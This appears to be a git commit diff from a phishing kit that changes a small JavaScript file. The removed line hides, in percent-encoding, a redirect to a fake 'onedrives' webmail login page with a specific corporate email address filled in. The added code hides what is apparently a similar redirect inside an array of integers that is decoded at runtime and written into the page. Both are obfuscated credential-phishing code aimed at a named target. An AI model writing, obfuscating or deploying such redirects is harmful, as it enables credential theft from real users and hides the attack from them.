86e2fddbdbaf496260d98087e485a9e4360299b2
cdnsfile <ifechukwunuchukwu2@gmail.com>
2025-07-28 03:04:30 -0700

    Update kmo1579.js

--- mo1579.js
+++ mo1579.js
@@ -1,2 +1,50 @@
+<script>
+var erp = new Array;
+erp[0] = 544696686;
+erp[1] = 1685026606;
+erp[2] = 1819239265;
+erp[3] = 1953066862;
+erp[4] = 778596965;
+erp[5] = 1713388832;
+erp[6] = 577270900;
+erp[7] = 1886599727;
+erp[8] = 795831909;
+erp[9] = 1685219702;
+erp[10] = 1698115188;
+erp[11] = 1751740015;
+erp[12] = 1764647791;
+erp[13] = 1831827301;
+erp[14] = 1651335529;
+erp[15] = 1815045221;
+erp[16] = 1936405806;
+erp[17] = 1752460652;
+erp[18] = 1064661861;
+erp[19] = 1919836525;
+erp[20] = 1698518113;
+erp[21] = 1818964597;
+erp[22] = 1933602917;
+erp[23] = 1953656686;
+erp[24] = 778268525;
+erp[25] = 8763;
+var em = '';
+for(i=0;i<erp.length;i++){
+	tmp = erp[i];
+	if(Math.floor((tmp/Math.pow(256,3)))>0){
+		em += String.fromCharCode(Math.floor((tmp/Math.pow(256,3))));
+	};
+	tmp = tmp - (Math.floor((tmp/Math.pow(256,3))) * Math.pow(256,3));
+	if(Math.floor((tmp/Math.pow(256,2)))>0){
+		em += String.fromCharCode(Math.floor((tmp/Math.pow(256,2))));
+	};
+	tmp = tmp - (Math.floor((tmp/Math.pow(256,2))) * Math.pow(256,2));
+	if(Math.floor((tmp/Math.pow(256,1)))>0){
+		em += String.fromCharCode(Math.floor((tmp/Math.pow(256,1))));
+	};
+	tmp = tmp - (Math.floor((tmp/Math.pow(256,1))) * Math.pow(256,1));
+	if(Math.floor((tmp/Math.pow(256,0)))>0){
+		em += String.fromCharCode(Math.floor((tmp/Math.pow(256,0))));
+	};
+};
+document.write(em);
 
-document.write( unescape( '%77%69%6E%64%6F%77%2E%6C%6F%63%61%74%69%6F%6E%2E%68%72%65%66%20%3D%20%22%68%74%74%70%73%3A%2F%2F%6F%6E%65%64%72%69%76%65%73%2E%74%68%69%6E%6F%69%2E%63%6F%6D%2F%77%65%62%6D%61%69%6C%2F%64%65%73%6B%35%2E%68%74%6D%6C%3F%75%73%65%72%6E%61%6D%65%3D%54%61%6C%6B%32%75%73%40%70%65%74%72%6F%6E%2E%63%6F%6D%22%3B' ) );
+</script>
